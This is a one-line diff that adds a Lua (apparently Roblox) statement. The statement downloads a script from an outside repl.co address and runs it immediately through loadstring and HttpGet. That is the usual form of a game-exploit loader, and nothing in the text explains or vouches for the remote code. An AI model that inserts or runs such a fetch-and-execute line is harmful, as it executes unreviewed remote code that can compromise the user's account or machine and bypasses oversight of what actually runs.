@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://rd.8bitlove22.repl.co/s/3008.lua'))()
